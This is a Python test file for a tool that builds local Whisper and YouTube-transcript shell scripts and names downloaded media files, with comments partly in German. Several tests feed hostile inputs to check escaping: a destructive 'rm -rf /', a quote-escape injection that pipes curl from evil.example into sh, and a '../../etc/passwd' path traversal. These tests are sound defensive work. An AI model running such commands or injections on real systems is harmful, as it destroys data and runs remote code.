"""Locally generated Whisper and YouTube-transcript commands.

The server sits on a datacenter IP that YouTube blocks. A home connection does
not, so when the server fails the tool hands over a command that works instead
of an apology. These pin down the details that broke in practice.
"""
import inspect
import pathlib
import re

import pytest

import main

FOLDER = "~/Downloads/download_abc12345"


# ── Whisper ───────────────────────────────────────────────────────────────────

def test_console_command_uses_an_underscore():
    """The package is mlx-whisper, the command is mlx_whisper — easy to confuse."""
    script = main.build_whisper_script(FOLDER)
    assert 'mlx_whisper "$f"' in script
    assert "mlx-whisper " not in script.replace("pip install -U mlx-whisper", "")


def test_no_python_dash_m_invocation():
    """mlx_whisper ships no __main__, so `python -m mlx_whisper` fails."""
    assert "python3 -m mlx_whisper" not in main.build_whisper_script(FOLDER)


def test_install_hint_mentions_pyenv_rehash():
    """New console scripts stay invisible under pyenv until rehash."""
    assert "pyenv rehash" in main.build_whisper_script(FOLDER)


def test_runs_per_clip_not_on_the_merged_file():
    """Whisper detects one language per run — a mixed merge would come out wrong."""
    script = main.build_whisper_script(FOLDER)
    assert "! -iname 'merged*'" in script
    assert "! -iname '*_merged*'" in script


def test_is_resumable():
    """A 99-clip run must survive Ctrl+C without redoing everything."""
    script = main.build_whisper_script(FOLDER)
    assert "schon vorhanden" in script


def test_language_defaults_to_auto_detection():
    """No --language means per-clip detection, which is what mixed material needs."""
    assert "--language" not in main.build_whisper_script(FOLDER)


def test_language_can_be_forced():
    assert "--language de" in main.build_whisper_script(FOLDER, language="de")


@pytest.mark.parametrize("key", list(main.WHISPER_MODELS))
def test_every_offered_model_lands_in_the_script(key):
    model_id = main.WHISPER_MODELS[key][0]
    assert model_id in main.build_whisper_script(FOLDER, model=key)


def test_unknown_model_falls_back_to_the_recommended_one():
    script = main.build_whisper_script(FOLDER, model="quatsch")
    assert main.WHISPER_MODELS["turbo"][0] in script


def test_unknown_format_falls_back_to_txt():
    assert "--output-format txt" in main.build_whisper_script(FOLDER, fmt="exe")


def test_results_are_collected_into_one_markdown_file():
    """Der Name war bis 10/2026 fest `alle_transkripte.md`. Die Datei landet
    aber im Ordner des Nutzers, nicht in einem Job-Ordner: wer an einem Tag
    zwei Stapel transkribiert, hat die erste Sammlung mit der zweiten
    überschrieben.

    Geprüft wird deshalb die Eigenschaft, nicht die Zeichenkette — ein Test
    auf einen festen Namen hält genau die Kollision fest, die weg sollte.
    """
    src = main.build_whisper_script(FOLDER)
    assert "alle_transkripte_" in src
    assert "date +" in src, "Der Name muss den Lauf datieren, sonst kollidiert er"
    assert 'alle_transkripte.md"' not in src


def test_tilde_is_expanded():
    assert 'cd "$HOME/Downloads/download_abc12345"' in main.build_whisper_script(FOLDER)


# ── Local YouTube transcript ──────────────────────────────────────────────────

URL = "https://www.youtube.com/watch?v=aqz-KE-bpKQ"


def test_url_is_embedded():
    assert URL in main.build_yt_transcript_script(URL)


def test_prefers_json3():
    """json3 gives clean, non-overlapping segments — vtt needs de-overlapping."""
    assert "json3/vtt/best" in main.build_yt_transcript_script(URL)


def test_rejects_a_non_url():
    """The value goes into a shell command — never interpolate junk."""
    script = main.build_yt_transcript_script("; rm -rf /")
    assert "rm -rf" not in script
    assert "DEINE_URL" in script


def test_native_language_asks_for_both_common_ones():
    # Auf den Wert prüfen, nicht auf die Anführungszeichen: seit die Sprache
    # durch shlex.quote geht, bleibt ein harmloser Wert nackt. Ein Test auf
    # «'de,en'» hätte die Absicherung als Fehler gemeldet.
    assert "--sub-langs de,en" in main.build_yt_transcript_script(URL, lang="native")


def test_language_cannot_escape_into_a_command():
    """Die Sprache stand roh in einfachen Anführungszeichen, aus denen
    `de'; curl x|sh; echo '` ausbricht. Das Produkt dieser Funktion ist eine
    Datei, die der Nutzer doppelklickt."""
    evil = "de'; curl evil.example|sh; echo '"
    out = main.build_yt_transcript_script(URL, lang=evil)
    assert "curl evil.example" not in out


def test_explicit_language_is_preferred_with_fallbacks():
    script = main.build_yt_transcript_script(URL, lang="fr")
    assert "fr,fr-orig,en,de" in script


def test_conversion_keeps_repeated_words():
    """The old engine deduplicated globally and lost ~80% of every transcript."""
    script = main.build_yt_transcript_script(URL)
    block = script.split("<<'PY'")[1].split("PY\n")[0]
    ns = {"__name__": "__main__"}
    import json, tempfile, os, sys
    data = {"events": [
        {"segs": [{"utf8": "das ist ein Test"}]},
        {"segs": [{"utf8": "\n"}]},
        {"segs": [{"utf8": "das ist wirklich ein Test"}]},
    ]}
    with tempfile.TemporaryDirectory() as d:
        p = os.path.join(d, "v.json3")
        with open(p, "w", encoding="utf-8") as fh:
            json.dump(data, fh)
        old = sys.argv
        sys.argv = ["conv", p]
        try:
            exec(compile(block, "conv", "exec"), ns)
        finally:
            sys.argv = old
        text = open(os.path.join(d, "v.txt"), encoding="utf-8").read()
    assert text.count("das ist") == 2        # repetitions survive
    assert "\n\n" not in text                # whitespace collapsed


# ── Eindeutige Mediennamen ────────────────────────────────────────────────────
#
# Die Bilder eines Karussells lagen als 01.jpg, 02.jpg in ihrem Job-Ordner.
# Dort kollidiert nichts, und genau deshalb ist es lange nicht aufgefallen:
# die Kollision entsteht beim Herunterladen, wenn zehn Karussells eines Tages
# im selben Ordner landen.

def test_shortcode_is_used_when_there_is_one():
    """Der Shortcode aus der Instagram-URL benennt den Beitrag weltweit und
    bleibt derselbe, auch ein Jahr später. Er lag die ganze Zeit in
    `want_code` und wanderte nie in einen Dateinamen."""
    stem = main.media_stem("ig", author="beispielkonto", ident="C8xYz1AbCdE",
                           job_id="deadbeef1234")
    assert stem == "ig_beispielkonto_C8xYz1AbCdE"
    # Die Job-Kennung ist dann überflüssig und würde den Namen nur verlängern.
    assert "deadbeef" not in stem


def test_job_id_carries_it_when_no_shortcode_exists():
    """Threads-Beiträge tragen keinen Shortcode. Ohne die Job-Kennung wären
    zwei Beiträge desselben Kontos wieder gleich benannt — also wieder
    kollidierend, nur weniger offensichtlich."""
    a = main.media_stem("threads", author="till", job_id="aaaaaaaa1111")
    b = main.media_stem("threads", author="till", job_id="bbbbbbbb2222")
    assert a != b and a.startswith("threads_till_")


def test_stem_survives_hostile_account_names():
    """Der Name landet in einem Dateipfad. Ein Konto, das Schrägstriche oder
    Punkte enthält, darf daraus keinen anderen Ordner machen."""
    stem = main.media_stem("ig", author="../../etc/passwd", ident="A1")
    assert "/" not in stem and ".." not in stem


def test_stem_is_never_empty_even_with_nothing_to_go_on():
    """Ohne Konto und ohne Shortcode bleibt die Plattform plus Job-Kennung.
    Ein leerer Stamm würde die Datei wieder nur nach ihrer Position benennen.
    """
    assert main.media_stem("ig", job_id="12345678abcd") == "ig_12345678"
    assert main.media_stem("ig") == "ig"


def test_text_sidecars_are_unique_too():
    """Die Medien wurden eindeutig benannt, die Textdateien nicht: sie hießen
    caption.md/caption.txt und thread.md/thread.txt. Das ist dieselbe
    Kollision, nur eine Datei weiter — wer zehn Posts an einem Tag in einen
    Ordner lädt, behält eine Bildunterschrift von zehn."""
    src = inspect.getsource(main)
    for fixed in ('"caption.md"', '"caption.txt"', '"thread.md"', '"thread.txt"'):
        assert f"job_dir / {fixed}" not in src, f"{fixed} wird wieder fest benannt"
    assert 'f"{stem}_Text.md"' in src and 'f"{stem}_Text.txt"' in src


# ── Auswahl der Medienart ─────────────────────────────────────────────────────

def test_batch_rejects_an_unknown_media_choice():
    """Der Wert kommt aus einem Formular und steuert, was heruntergeladen
    wird. Ein Tippfehler darf nicht stillschweigend zu »alles« werden."""
    src = inspect.getsource(main.batch)
    assert '("alle", "fotos", "videos")' in src
    assert "Unbekannte Medienauswahl" in src


def test_both_extractors_honour_the_choice():
    """Ein Karussell kann Fotos UND Videos enthalten. Vorher kam immer
    beides, und »nur die Fotos« ließ sich gar nicht ausdrücken — der Modus
    hieß obendrein »Video«, was bei einem Fotobeitrag falsch ist."""
    for fn in (main._download_instagram_media, main._download_threads):
        src = inspect.getsource(fn)
        assert '"media", "alle"' in src, fn.__name__
        assert 'want == "fotos"' in src and 'want == "videos"' in src, fn.__name__


def test_choice_reaches_the_job_record():
    """Die Extraktoren lesen die Auswahl aus dem Job. Fehlt sie dort, greift
    überall der Standard und die Auswahl wäre wirkungslos — ohne Fehler."""
    assert '"media": media' in inspect.getsource(main.batch)


# ── Kein zweiter Livestream-Generator ────────────────────────────────────────

def test_the_ui_does_not_build_livestream_commands_itself():
    """Es gab dieselbe Logik zweimal: in build_livestream_script und als
    genLive() im Template. Als die festen Format-Nummern durch Ausdrücke
    ersetzt wurden, geschah das nur in der Python-Hälfte — die Oberfläche
    erzeugte weiter `-f 96` und `f137.mp4.part` und damit genau den Fehler,
    der behoben sein sollte. Behoben war er nur für Assistenten über MCP.

    Ein Spiegel, den niemand prüft, driftet. Dieser Test hält fest, dass es
    keinen zweiten gibt."""
    html = (pathlib.Path(main.__file__).parent / "templates" / "index.html").read_text()
    # Kommentarzeilen zählen nicht — dort steht die Begründung.
    code = "\n".join(l for l in html.splitlines() if not l.strip().startswith("//"))
    for itag in ("137+140", "136+140", "f137", "f140", "'96'", "'95'", "'94'"):
        assert itag not in code, f"Feste Format-Nummer {itag} wieder in der Oberfläche"
    assert "/api/livestream-script" in code, "Die Oberfläche holt die Befehle nicht mehr vom Server"


def test_livestream_route_rejects_an_unknown_mode():
    src = inspect.getsource(main.livestream_script)
    assert '("now", "start", "section", "merge", "scan")' in src
